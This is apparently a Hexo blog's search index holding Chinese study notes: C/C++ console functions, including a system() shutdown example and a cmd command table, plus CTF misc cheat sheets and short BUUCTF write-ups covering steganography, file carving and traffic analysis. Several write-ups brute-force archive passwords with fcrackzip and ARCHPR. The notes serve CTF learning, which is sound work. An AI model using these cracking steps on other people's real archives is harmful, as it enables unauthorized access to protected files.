<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>C/C++</title>
      <link href="/2022/11/15/C-C/"/>
      <url>/2022/11/15/C-C/</url>
      
        <content type="html"><![CDATA[<h2 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h2><h3 id="system（）函数"><a href="#system（）函数" class="headerlink" title="system（）函数"></a>system（）函数</h3><p>⚪函数原型：</p><p>int system(const char * command)</p><p>⚪头文件：</p><p><code>stdlib.h&gt;</code></p><p>⚪示例：</p><p><code>system(&quot;color ab&quot;)</code>  &#x2F;&#x2F;a控制背景色，可省略。b是字体色。a、b用数字0-9和字母A-F</p><blockquote><p>0 黑，1 蓝，2 绿，3 湖蓝，4 红，5 紫，6 黄，7 白，8 灰，9 淡蓝，A 淡绿</p><p>B 淡浅绿，C 淡红，D 淡紫,E 淡黄，F 亮白 </p></blockquote><p><code> system(&quot;shutdown -s -t 60&quot;);    //这是Windows系统下的一个关机命令,-t 60表示60秒后。-s表示关机，可替换成-r表示重启</code>  </p><p><code> system(&quot;shutdown -a&quot;);    //表示取消关机</code> </p><p><code> system(&quot;pause&quot;);    //暂停</code> </p><p>⚪参数：</p><table><thead><tr><th>参数</th><th>功能</th><th>说明</th></tr></thead><tbody><tr><td>ASSOC</td><td>显示或修改文件扩展名关联</td><td></td></tr><tr><td>ATTRIB</td><td>显示或更改文件属性</td><td></td></tr><tr><td>BREAK</td><td>设置或清除扩展式 CTRL&#43;C 检查</td><td></td></tr><tr><td>BCDEDIT</td><td>设置启动数据库中的属性以控制启动加载</td><td></td></tr><tr><td>CACLS</td><td>显示或修改文件的访问控制列表(ACL)</td><td></td></tr><tr><td>CALL</td><td>从另一个批处理程序调用这一个</td><td></td></tr><tr><td>CD</td><td>显示当前目录的名称或将其更改</td><td></td></tr><tr><td>CHCP</td><td>显示或设置活动代码页数</td><td></td></tr><tr><td>CHDIR</td><td>显示当前目录的名称或将其更改</td><td></td></tr><tr><td>CHKDSK</td><td>检查磁盘并显示状态报告</td><td></td></tr><tr><td>CHKNTFS</td><td>显示或修改启动时间磁盘检查</td><td></td></tr><tr><td>CLS</td><td>清除屏幕</td><td>*</td></tr><tr><td>CMD</td><td>打开另一个 Windows 命令解释程序窗口</td><td>*</td></tr><tr><td>COLOR</td><td>设置默认控制台前景和背景颜色</td><td>*</td></tr><tr><td>COMP</td><td>比较两个或两套文件的内容</td><td></td></tr><tr><td>COMPACT</td><td>显示或更改 NTFS 分区上文件的压缩</td><td></td></tr><tr><td>CONVERT</td><td>将 FAT 卷转换成 NTFS 你不能转换当前驱动器</td><td></td></tr><tr><td>COPY</td><td>将至少一个文件复制到另一个位置</td><td></td></tr><tr><td>DATE</td><td>显示或设置日期</td><td>后面加 /t 表示显示日期</td></tr><tr><td>DEL</td><td>删除至少一个文件</td><td></td></tr><tr><td>DIR</td><td>显示一个目录中的文件和子目录</td><td></td></tr><tr><td>DISKPART</td><td>显示或配置磁盘分区属性</td><td></td></tr><tr><td>DOSKEY</td><td>编辑命令行、撤回 Windows 命令并创建宏</td><td></td></tr><tr><td>DRIVERQUERY</td><td>显示当前设备驱动程序状态和属性</td><td></td></tr><tr><td>ECHO</td><td>显示消息&#xff0c;或将命令回显打开或关闭</td><td></td></tr><tr><td>ENDLOCAL</td><td>结束批文件中环境更改的本地化</td><td></td></tr><tr><td>ERASE</td><td>删除一个或多个文件</td><td>*</td></tr><tr><td>EXIT</td><td>退出 CMD.EXE 程序(命令解释程序)</td><td>*</td></tr><tr><td>FC</td><td>比较两个文件或两个文件集并显示它们之间的不同</td><td>*</td></tr><tr><td>FIND</td><td>在一个或多个文件中搜索一个文本字符串</td><td>*</td></tr><tr><td>FINDSTR</td><td>在多个文件中搜索字符串</td><td>*</td></tr><tr><td>FOR</td><td>为一组文件中的每个文件运行一个指定的命令</td><td></td></tr><tr><td>FORMAT</td><td>格式化磁盘&#xff0c;以便用于 Windows</td><td></td></tr><tr><td>FSUTIL</td><td>显示或配置文件系统属性</td><td></td></tr><tr><td>FTYPE</td><td>显示或修改在文件扩展名关联中使用的文件类型</td><td></td></tr><tr><td>GOTO</td><td>将 Windows 命令解释程序定向到批处理程序中某个带标签的行</td><td></td></tr><tr><td>GPRESULT</td><td>显示计算机或用户的组策略信息</td><td></td></tr><tr><td>GRAFTABL</td><td>使 Windows 在图形模式下显示扩展字符集</td><td>*</td></tr><tr><td>HELP</td><td>提供 Windows 命令的帮助信息</td><td></td></tr><tr><td>ICACLS</td><td>显示、修改、备份或还原文件和目录的 ACL</td><td></td></tr><tr><td>IF</td><td>在批处理程序中执行有条件的处理操作</td><td></td></tr><tr><td>LABEL</td><td>创建、更改或删除磁盘的卷标</td><td></td></tr><tr><td>MD</td><td>创建一个目录</td><td></td></tr><tr><td>MKDIR</td><td>创建一个目录</td><td></td></tr><tr><td>MKLINK</td><td>创建符号链接和硬链接</td><td></td></tr><tr><td>MODE</td><td>配置系统设备</td><td></td></tr><tr><td>MORE</td><td>逐屏显示输出</td><td>*</td></tr><tr><td>MOVE</td><td>将一个或多个文件从一个目录移动到另一个目录</td><td></td></tr><tr><td>OPENFILES</td><td>显示远程用户为了文件共享而打开的文件</td><td></td></tr><tr><td>PATH为</td><td>可执行文件显示或设置搜索路径</td><td></td></tr><tr><td>PAUSE</td><td>暂停批处理文件的处理并显示消息</td><td></td></tr><tr><td>POPD</td><td>还原通过 PUSHD 保存的当前目录的上一个值</td><td></td></tr><tr><td>PRINT</td><td>打印一个文本文件</td><td></td></tr><tr><td>PROMPT</td><td>更改 Windows 命令提示</td><td></td></tr><tr><td>PUSHD</td><td>保存当前目录&#xff0c;然后对其进行更改</td><td></td></tr><tr><td>RD</td><td>删除目录</td><td></td></tr><tr><td>RECOVER</td><td>从损坏的或有缺陷的磁盘中恢复可读信息</td><td>*</td></tr><tr><td>REM</td><td>记录批处理文件或 CONFIG.SYS 中的注释(批注)</td><td></td></tr><tr><td>REN</td><td>重命名文件</td><td></td></tr><tr><td>RENAME</td><td>重命名文件</td><td></td></tr><tr><td>REPLACE</td><td>替换文件</td><td>*</td></tr><tr><td>RMDIR</td><td>删除目录</td><td></td></tr><tr><td>ROBOCOPY</td><td>复制文件和目录树的高级实用工具</td><td></td></tr><tr><td>SET</td><td>显示、设置或删除 Windows 环境变量</td><td></td></tr><tr><td>SETLOCAL</td><td>开始本地化批处理文件中的环境更改</td><td></td></tr><tr><td>SC</td><td>显示或配置服务(后台进程)</td><td></td></tr><tr><td>SCHTASKS</td><td>安排在一台计算机上运行命令和程序</td><td></td></tr><tr><td>SHIFT</td><td>调整批处理文件中可替换参数的位置</td><td></td></tr><tr><td>SHUTDOWN</td><td>允许通过本地或远程方式正确关闭计算机</td><td></td></tr><tr><td>SORT</td><td>对输入排序</td><td></td></tr><tr><td>START</td><td>启动单独的窗口以运行指定的程序或命令</td><td></td></tr><tr><td>SUBST</td><td>将路径与驱动器号关联</td><td></td></tr><tr><td>SYSTEMINFO</td><td>显示计算机的特定属性和配置</td><td></td></tr><tr><td>TASKLIST</td><td>显示包括服务在内的所有当前运行的任务</td><td></td></tr><tr><td>TASKKILL</td><td>中止或停止正在运行的进程或应用程序</td><td></td></tr><tr><td>TIME</td><td>显示或设置系统时间</td><td>后面加 /t 表示显示时间</td></tr><tr><td>TITLE</td><td>设置 CMD.EXE 会话的窗口标题</td><td>“TITLE 你想改成啥”</td></tr><tr><td>TREE</td><td>以图形方式显示驱动程序或路径的目录结构</td><td>“TREE D:”</td></tr><tr><td>TYPE</td><td>显示文本文件的内容</td><td>“TYPE D:\\文本.txt”</td></tr><tr><td>VER</td><td>显示 Windows 的版本</td><td></td></tr><tr><td>VERIFY</td><td>告诉 Windows 是否进行验证&#xff0c;以确保文件正确写入磁盘</td><td></td></tr><tr><td>VOL</td><td>显示磁盘卷标和序列号</td><td></td></tr><tr><td>XCOPY</td><td>复制文件和目录树</td><td></td></tr><tr><td>WMIC</td><td>在交互式命令 shell 中显示 WMI 信息</td><td></td></tr></tbody></table>### SetConsoleTextAttribute()函数<p>⚪介绍：</p><p>SetConsoleTextAttribute()函数是一个API设置字体颜色和背景色的函数。参数表中使用两个属性（属性之间用，隔开），不同于system(color)，SetConsoleTextAttribute()可以改变界面多种颜色，而system()只能修改为一种。</p><p>⚪函数原型：</p><p>BOOL SetConsoleTextAttribute(HANDLE hConsoleOutput, WORD wAttributes);</p><p>⚪头文件：<code>&lt;windows.h&gt;</code></p><p>⚪参数：</p><p>HANDLE hConsoleOutput consolehwnd &#x3D; GetStdHandle(STD_OUTPUT_HANDLE) GetStdHandle(nStdHandle)是返回标准的输入、输出或错误的设备的句柄，也就是获得输入、输出&#x2F;错误的屏幕缓冲区的句柄。</p><p>其参数nStdHandle的值为下面几种类型的一种:</p><table><thead><tr><th align="left">值</th><th align="left">含义</th></tr></thead><tbody><tr><td align="left">STD_INPUT_HANDLE</td><td align="left">标准输入的句柄</td></tr><tr><td align="left">STD_OUTPUT_HANDLE</td><td align="left">标准输出的句柄</td></tr><tr><td align="left">STD_ERROR_HANDLE</td><td align="left">标准错误的句柄</td></tr></tbody></table><p>其他颜色参数</p><table><thead><tr><th align="left">属性</th><th align="left">含义</th></tr></thead><tbody><tr><td align="left">FOREGROUND_BLUE</td><td align="left">文字颜色包含蓝色</td></tr><tr><td align="left">FOREGROUND_GREEN</td><td align="left">文字颜色包含绿色</td></tr><tr><td align="left">FOREGROUND_RED</td><td align="left">文字颜色包含红色</td></tr><tr><td align="left">FOREGROUND_INTENSITY</td><td align="left">文字颜色加强</td></tr><tr><td align="left">BACKGROUND_BLUE</td><td align="left">背景颜色包含蓝色</td></tr><tr><td align="left">BACKGROUND_GREEN</td><td align="left">背景颜色包含绿色</td></tr><tr><td align="left">BACKGROUND_RED</td><td align="left">背景颜色包含红色</td></tr><tr><td align="left">BACKGROUND_INTENSITY</td><td align="left">背景颜色加剧</td></tr><tr><td align="left">COMMON_LVB_LEADING_BYTE</td><td align="left">前导字节</td></tr><tr><td align="left">COMMON_LVB_TRAILING_BYTE</td><td align="left">尾随字节</td></tr><tr><td align="left">COMMON_LVB_GRID_HORIZONTAL</td><td align="left">顶部水平</td></tr><tr><td align="left">COMMON_LVB_GRID_LVERTICAL</td><td align="left">左垂直</td></tr><tr><td align="left">COMMON_LVB_GRID_RVERTICAL</td><td align="left">正确的垂直</td></tr><tr><td align="left">COMMON_LVB_REVERSE_VIDEO</td><td align="left">反转前景和背景属性</td></tr><tr><td align="left">COMMON_LVB_UNDERSCORE</td><td align="left">下划线</td></tr></tbody></table><p>⚪代码的三种书写形式：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), 0x07);</span><br><span class="line">//第二个参数填十六进制数字。</span><br><span class="line">SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), 7);</span><br><span class="line">//直接填十进制数字。</span><br><span class="line">SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), BACKGROUND_BLACK | FOREGROUND_RED);</span><br><span class="line">//BACKGROUND代表背景，FOREGROUND代表前景，</span><br></pre></td></tr></table></figure><p>⚪颜色设定示例</p><img src="https://blue-blue-blue-blue.github.io/img/f1.png" width ="60%"><h2 id="Sleep-函数"><a href="#Sleep-函数" class="headerlink" title="Sleep()函数"></a>Sleep()函数</h2><p>⚪函数原型：</p><p>unsigned sleep(unsigned seconds); </p><p>&#x2F;&#x2F;在VC下写做Sleep,其他情况下为sleep在VC中，Sleep()里面的单位，是以毫秒为单位，所以如果想让函数滞留1秒的话，应该是Sleep(1000); 在Linux下,sleep()里面的单位是秒，而不是毫秒。</p><p>⚪头文件:</p><p>#include &lt;windows.h&gt;        &#x2F;&#x2F;在Linux下,gcc编译器中，使用的头文件因gcc版本的不同而不同#include &lt;unistd.h&gt;　</p><p>⚪功能：</p><p>使计算机程序（进程，任务或线程）进入休眠，使其在一段时间内处于非活动状态。当函数设定的计时器到期，或者接收到信号、程序发生中断都会导致程序继续执行。</p><p>⚪其他类似函数：</p><p><strong>usleep函数:</strong></p><p>功能:　usleep功能把进程挂起一段时间， 单位是微秒us（百万分之一秒）。</p><p>语法: void usleep(int micro_seconds);</p><p>返回值: 无</p><p>注意：这个函数不能工作在 Windows 操作系统中。</p><p>usleep() 与sleep()类似，用于延迟挂起进程。进程被挂起放到reday queue。只是一般情况下，延迟时间数量级是秒的时候，尽可能使用sleep()函数。且此函数已被废除，可使用nanosleep。　</p><p>如果延迟时间为几十毫秒，或者更小，尽可能使用usleep()函数。这样才能最佳的利用CPU时间。</p><p><strong>delay函数:</strong>　</p><p>功 能: 将程序的执行暂停一段时间，单位是毫秒ms(千分之一秒) 　</p><p>用 法: void delay(unsigned milliseconds); 　</p><p>与sleep()的区别：</p><p>delay()是循环等待，该进程还在运行，占用处理器。   sleep()不同，它会被挂起，把处理器让给其他的进程。</p><p>sleep()参数指定暂停时间，单位是s。delay()参数指定暂停时间，单位是ms。</p><h2 id="输入与输出"><a href="#输入与输出" class="headerlink" title="输入与输出"></a>输入与输出</h2><p>⚪getch() 、getche()、getchar()区别</p><p>getch()、getche()与getchar功能相同，区别是：</p><p>getch不带回显，且不需要用户按回车就可显示；</p><p>getche带回显，且不需要用户按回车就可显示；</p><p>getchar()带回显，但是需要用户按回车才能显示，可以输入一串字符，但只返回第一个字符的ASCII；</p><p>getch和getche调用格式#include &lt;conio.h&gt;</p><p>getchar调用格式 #include &lt;conio.h&gt;</p><p>⚪gets函数</p><p>gets函数能会造成缓冲区溢出, 甚至程序崩溃。可能被禁用。此时：</p><p>方法1: 使用gets_s函数</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> str[<span class="number">10</span>];</span><br><span class="line"><span class="built_in">gets_s</span>(str);   </span><br><span class="line"><span class="built_in">gets_s</span>(str, <span class="number">10</span>);</span><br></pre></td></tr></table></figure><p>方法2: 使用fgets函数</p><blockquote><p>从标准输入流中读取10字节（包括’\0’）到字符数组str中, 超出就自动截断, 不会出错。</p></blockquote><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> str[<span class="number">10</span>];</span><br><span class="line"><span class="built_in">fgets</span>(str, <span class="number">10</span>, stdin);</span><br></pre></td></tr></table></figure><p>⚪putchar</p><p>头文件 ：</p><p>&lt;stdio.h&gt;</p><p>功能：</p><p>putchar 输出单个字符<br>形式：<br>putchar（字符数据）；<br>例子：<br>char a_c&#x3D;‘h’；<br>putchar（a_c）；<br>putchar（‘d’）；<br>putchar(97); &#x2F;&#x2F;a<br>putchar(‘a’+25); &#x2F;&#x2F; z</p><p>⚪puts</p><p>功能：puts需要提供字符串供输出，其他类型的数据要输出也要转换成字符串再提供给puts函数<br>形式：puts（字符串名）；<br>例子：puts（“hello girl”）；</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Hackergame 2022</title>
      <link href="/2022/10/22/Hackergame-2022/"/>
      <url>/2022/10/22/Hackergame-2022/</url>
      
        <content type="html"><![CDATA[<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h2><p>试着写2022，url变为202.38.93.111:12022&#x2F;?result&#x3D;2???，由于第三和第四个数字不可能写出，直接get传参2022</p><img src="https://blue-blue-blue-blue.github.io/img/e1.png" width ="60%">]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>misc-key</title>
      <link href="/2022/10/08/misc-key/"/>
      <url>/2022/10/08/misc-key/</url>
      
        <content type="html"><![CDATA[<blockquote><p> 注意</p><p>flag可能跟在Password和Username后面</p></blockquote><blockquote><h2 id="源数据区"><a href="#源数据区" class="headerlink" title="源数据区"></a>源数据区</h2><p><strong>JPEG (jpg)，</strong><br>文件头：FFD8FF　　 文件尾：FF D9　</p><p>FF C0-SO F0图像基本信息 FF C0 后1、2个字节是SOF0块长度，第3个是每个像素的每个颜色分量为几位，第4，5是图片高度，第6，7是图片宽度，第8是组件数量</p><p><strong>PNG (png)，</strong> 　<br>文件头：89 50 4E 47　 文件尾：AE 42 60 82</p><p>用二进制打开的.png文件的第二行中，前四位表示的是宽度，后四位表示的是长度</p><p><strong>GIF (gif)，</strong> 　<br>文件头：47 49 46 38　 文件尾：00 3B</p><p><strong>ZIP Archive (zip)，</strong><br>文件头：50 4B 03 04　　 文件尾：50 4B</p><p><strong>TIFF (tif)，</strong><br>文件头：49 49 2A 00</p><p>Windows Bitmap (<strong>bmp)，</strong><br>文件头：42 4D</p><p><strong>CAD (dwg)，</strong><br>文件头：41433130　</p><p>Adobe Photoshop <strong>(psd)，</strong><br>文件头：38425053　</p><p>**Rich Text Format (rtf)**，<br>文件头：7B5C727466　</p><p><strong>XML (xml)，</strong><br>文件头：3C3F786D6C　</p><p><strong>HTML (html)，</strong><br>文件头：68746D6C3E</p><p>**Email [thorough only] (eml)**，<br>文件头：44656C69766572792D646174653A</p><p><strong>Outlook Express (dbx)，</strong><br>文件头：CFAD12FEC5FD746F<br>**Outlook (pst)**，<br>文件头：2142444E</p><p>*<em>MS Word&#x2F;Excel (*<em>xls.or.doc*</em>)，</em>*<br>文件头：D0CF11E0</p><p>**MS Access (*<em>mdb*</em>)**，<br>文件头：5374616E64617264204A</p><p>*<em>WordPerfect (*<em>wpd*</em>)，</em>*<br>文件头：FF575043</p><p><strong>Adobe Acrobat *<em>(pdf*</em>)，</strong><br>文件头：255044462D312E</p><p><strong>Quicken *<em>(qdf)，*</em></strong><br>文件头：AC9EBD8F</p><p>**Windows Password (*<em>pwl)*<em>，</em></em><br>文件头：E3828596</p><p>**RAR Archive (rar)**，<br>文件头：52617221</p><p><strong>Wave (wav)，</strong> 文件头：57415645<br><strong>AVI (avi)，</strong> 文件头：41564920<br><strong>Real Audio (ram)，</strong> 文件头：2E7261FD<br>**Real Media (rm)**， 文件头：2E524D46<br>**MPEG (mpg)**， 文件头：000001BA<br><strong>MPEG (mpg)，</strong> 文件头：000001B3<br><strong>Quicktime (mov)，</strong> 文件头：6D6F6F76<br><strong>Windows Media (asf)，</strong> 文件头：3026B2758E66CF11<br><strong>MIDI (mid)，</strong> 文件头：4D546864</p></blockquote><blockquote><h2 id="EXIF"><a href="#EXIF" class="headerlink" title="EXIF"></a>EXIF</h2><p>（可交换图像文件格式）可以用来记录数码照片的属性信息和拍摄数据，EXIF可以被附加在JPEG、TIFF、RIFF等文件中，为其增加有关数码相机拍摄信息的内容。缩略图或图像处理软件的一些版本信息。     </p><p> 点击图片属性查看，看备注之类的</p></blockquote><blockquote><h2 id="LSB隐写"><a href="#LSB隐写" class="headerlink" title="LSB隐写"></a>LSB隐写</h2><p>LSB隐写就是修改RGB颜色分量的最低二进制位也就是最低有效位，而人类的眼睛不会注意到这前后的变化，每个像数可以携带3比特的信息。lsb只适用于png和bmp文件。</p><p>一般用Stegsolve（cmd里执行javaw -jar “D:\ctf\Stegsolve.jar”打开）解开。</p></blockquote><blockquote><h2 id="伪加密"><a href="#伪加密" class="headerlink" title="伪加密"></a>伪加密</h2><p>.jpg:开头四个字节后  第五个字节</p><p>.zip：开头四个后，第3、4个</p><p>.rar:找到第24个字节，该字节尾数为4表示加密，0表示无加密，将尾数改为0即可破解伪加密。</p></blockquote><blockquote><h2 id="binwalk"><a href="#binwalk" class="headerlink" title="binwalk"></a>binwalk</h2><blockquote><p>扫描</p><p>binwalk firmware.bin</p><p>通过扫描能够智能的发现目标文件中包含的所有可识别的文件类型。</p><p>binwalk firmware.bin | head<br>binwalk -e pcat.bin</p><p>分解出文件，使用此命令，可以无视伪加密压缩包、多分割压缩包以及其他文件分解。</p><p>binwalk -D&#x3D;jpeg pcat.bin</p><p>可以指定某种类型的文件进行分解。（–dd与此命令相同，并且均支持正则表达式）</p><p>binwalk -eM pcat.bin</p><p>-M选项和–matroshak 为 递归提取，仅支持 “-e” 和 “–dd”，递归依据是根据magic签名。</p><p>binwalk –dd ‘zip archive:zip:unzip %e’ pcat.bin</p><p>指定文件分解 正则</p></blockquote></blockquote><blockquote><h2 id="gnuplot"><a href="#gnuplot" class="headerlink" title="gnuplot"></a>gnuplot</h2><blockquote><p>已知形如（7，7）的一堆坐标点，进行绘图</p><p>先调格式：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;result.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> res:  <span class="comment"># 坐标格式文件比如(7,7),result.txt是转换前的坐标</span></span><br><span class="line"> re = res.read()</span><br><span class="line"> res.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;1111.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> gnup:   <span class="comment"># 将转换后的坐标写入1111.txt</span></span><br><span class="line"> re = re.split()</span><br><span class="line"> tem = <span class="string">&#x27;&#x27;</span></span><br><span class="line"> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(re)):</span><br><span class="line">     tem = re[i]</span><br><span class="line">     tem = tem.lstrip(<span class="string">&#x27;(&#x27;</span>)</span><br><span class="line">     tem = tem.rstrip(<span class="string">&#x27;)&#x27;</span>)</span><br><span class="line">     <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(tem)):</span><br><span class="line">         <span class="keyword">if</span> tem[j] == <span class="string">&#x27;,&#x27;</span>:</span><br><span class="line">             tem = tem[:j] + <span class="string">&#x27; &#x27;</span> + tem[j+<span class="number">1</span>:]</span><br><span class="line">     gnup.write(tem + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"> gnup.close()</span><br></pre></td></tr></table></figure><p>进入转换后的文件所在的目录，执行<code>gnuplot</code>       <code>plot &quot;文件名&quot;</code> 即可</p><h4 id="待解决的问题：我用文本替换调的格式，结果绘制不成功，将脚本运行后的文件ctrl-A-、ctrl-c后ctrl-v入新的txt文件，新得到的文件同样绘制不成功，显示Bad-data-on-line-1-of-file-flag-txt"><a href="#待解决的问题：我用文本替换调的格式，结果绘制不成功，将脚本运行后的文件ctrl-A-、ctrl-c后ctrl-v入新的txt文件，新得到的文件同样绘制不成功，显示Bad-data-on-line-1-of-file-flag-txt" class="headerlink" title="待解决的问题：我用文本替换调的格式，结果绘制不成功，将脚本运行后的文件ctrl+A 、ctrl+c后ctrl+v入新的txt文件，新得到的文件同样绘制不成功，显示Bad data on line 1 of file flag.txt ???"></a>待解决的问题：我用文本替换调的格式，结果绘制不成功，将脚本运行后的文件ctrl+A 、ctrl+c后ctrl+v入新的txt文件，新得到的文件同样绘制不成功，显示<code>Bad data on line 1 of file flag.txt</code> ???</h4></blockquote></blockquote>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>MISC-BUUCTF</title>
      <link href="/2022/10/08/MISC-BUUCTF/"/>
      <url>/2022/10/08/MISC-BUUCTF/</url>
      
        <content type="html"><![CDATA[<h1 id="第一页"><a href="#第一页" class="headerlink" title="第一页"></a>第一页</h1><h2 id="黄三胖"><a href="#黄三胖" class="headerlink" title="黄三胖"></a>黄三胖</h2><p>在ps中一帧一帧查看即可</p><h2 id="二维码"><a href="#二维码" class="headerlink" title="二维码"></a>二维码</h2><p>扫描二维码，没有结果。在010打开，发现文件结尾不是AE 42 60 82（png文件结尾标志），AE 42 60 82后是50 4B 03 04（.zip文件开始的标志）      在Linux终端执行“binwalk -e 文件名”，会自动下载zip文件，打开后发现需要密码，执行”fcrackzip -b -c1 -u -l4 文件名“</p><h2 id="你竟然赶我走-1"><a href="#你竟然赶我走-1" class="headerlink" title="你竟然赶我走 1"></a>你竟然赶我走 1</h2><p>010查看，末尾即是flag</p><h2 id="N种方法解决-1"><a href="#N种方法解决-1" class="headerlink" title="N种方法解决 1"></a>N种方法解决 1</h2><p>exe打不开，用010打开,发现不是exe文件，是.jpg转成了base64，将010里的一长串复制到浏览器的url，得到二维码，扫出来即可</p><img src="https://blue-blue-blue-blue.github.io/img/c1.png" width ="60%"><h2 id="大白-1"><a href="#大白-1" class="headerlink" title="大白 1"></a>大白 1</h2><p>用010打开，修改图片长度（用二进制打开的.png文件的第二行中，前四位表示的是宽度，接下来四位表示的是长度）</p><h2 id="乌镇峰会种图"><a href="#乌镇峰会种图" class="headerlink" title="乌镇峰会种图"></a>乌镇峰会种图</h2><p>用010打开，末尾即是flag</p><h2 id="基础破解"><a href="#基础破解" class="headerlink" title="基础破解"></a>基础破解</h2><p>已知rar压缩包密码四位数字，ARCHPR爆破一下,再base64解密</p><img src="https://blue-blue-blue-blue.github.io/img/c2.png" width ="60%"><h2 id="wireshark"><a href="#wireshark" class="headerlink" title="wireshark"></a>wireshark</h2><p>将文件在wireshark打开，输入http.request.method&#x3D;&#x3D;POST筛选，再字符串查找flag</p><img src="https://blue-blue-blue-blue.github.io/img/c3.png" width ="60%"><h2 id="文件中的秘密-1"><a href="#文件中的秘密-1" class="headerlink" title="文件中的秘密 1"></a>文件中的秘密 1</h2><p>010打开，提示EXIF，点击图片属性查看，备注里就有flag</p><img src="https://blue-blue-blue-blue.github.io/img/c4.png" width ="60%"><h2 id="LSB-1"><a href="#LSB-1" class="headerlink" title="LSB 1"></a>LSB 1</h2><p>用stegsolve打开，依次查看图像，发现red,blue,green0通道似乎有东西，选择后点击save bin,发现是png文件，打开扫二维码即可</p><img src="https://blue-blue-blue-blue.github.io/img/c5.png" width ="60%"><h2 id="zip伪加密"><a href="#zip伪加密" class="headerlink" title="zip伪加密"></a>zip伪加密</h2><p>010打开，将2个09改为00，之后就没有密码了</p><img src="https://blue-blue-blue-blue.github.io/img/c6.png" width ="60%"><h2 id="rar"><a href="#rar" class="headerlink" title="rar"></a>rar</h2><p>已知rar压缩包密码四位数字，ARCHPR爆破一下</p><h2 id="被嗅探的流量-1"><a href="#被嗅探的流量-1" class="headerlink" title="被嗅探的流量 1"></a>被嗅探的流量 1</h2><p>用wireshark 打开，筛选POST，追踪TCP流，查找flag</p><img src="https://blue-blue-blue-blue.github.io/img/c7.png" width ="60%"><h2 id="qr"><a href="#qr" class="headerlink" title="qr"></a>qr</h2><p>扫二维码即可</p><h2 id="镜子里面的世界"><a href="#镜子里面的世界" class="headerlink" title="镜子里面的世界"></a>镜子里面的世界</h2><p>用Stegsolve打开，R、G、B通道的最低有效位导出的txt文件里即包含flag</p><img src="https://blue-blue-blue-blue.github.io/img/c8.png" width ="60%"><h2 id="ningen"><a href="#ningen" class="headerlink" title="ningen"></a>ningen</h2><p>用010打开，发现是图片里藏有zip文件，分离出来，用ARCHPR爆破即可</p><h2 id="小明的保险箱"><a href="#小明的保险箱" class="headerlink" title="小明的保险箱"></a>小明的保险箱</h2><p>用010打开，发现是图片里藏有zip文件，分离出来，用ARCHPR爆破即可</p><h2 id="爱因斯坦"><a href="#爱因斯坦" class="headerlink" title="爱因斯坦"></a>爱因斯坦</h2><p>用010打开，发现是图片里藏有zip文件，分离出来。伪加密的解法行不通，点击图片属性，备注即使zip密码</p><h2 id="easycap"><a href="#easycap" class="headerlink" title="easycap"></a>easycap</h2><p>wireshark打开，发现从第四个包开始陆续有包有Data,将Data的数据依次记录下来，执行16进制转ASCII</p><img src="https://blue-blue-blue-blue.github.io/img/c9.png" width ="60%"><h2 id="隐藏的钥匙"><a href="#隐藏的钥匙" class="headerlink" title="隐藏的钥匙"></a>隐藏的钥匙</h2><p>用010打开，发现里面有base64加密的flag，解密即可</p><h2 id="另外一个世界"><a href="#另外一个世界" class="headerlink" title="另外一个世界"></a>另外一个世界</h2><p>用010打开，发现末尾是一串二进制码，2转16转ASCII即可</p><h2 id="FLAG"><a href="#FLAG" class="headerlink" title="FLAG"></a>FLAG</h2><p>用Stegsolve打开，分出zip文件，flag就在里面</p><img src="https://blue-blue-blue-blue.github.io/img/c10.png" width ="60%"><h2 id="神秘龙卷风"><a href="#神秘龙卷风" class="headerlink" title="神秘龙卷风"></a>神秘龙卷风</h2><p>ARCHPR爆破出密码后，brainfuck运行即可</p><h2 id="假如给我三天光明"><a href="#假如给我三天光明" class="headerlink" title="假如给我三天光明"></a>假如给我三天光明</h2><p>照片下面有盲文，对照得打开音频文件的密码，用Audacity打开，摩斯密码解密得到CTFWPEI08732?23DZ，但是flag是flag{wpei08732?23dz}  （啧）</p><h2 id="数据包中的线索"><a href="#数据包中的线索" class="headerlink" title="数据包中的线索"></a>数据包中的线索</h2><p>用wireshark打开文件，发现大多数是TCP，就筛选http,找到一个数据异常多的包，追踪其http流，将相应的内容base64转文件，下载转出来的.jpg文件，里面即有flag</p><img src="https://blue-blue-blue-blue.github.io/img/c11.png" width ="60%"><h2 id="后门查杀"><a href="#后门查杀" class="headerlink" title="后门查杀"></a>后门查杀</h2><p>用杀毒软件扫描文件，发现有后门病毒，打开相对应的文件，里面即有flag</p><img 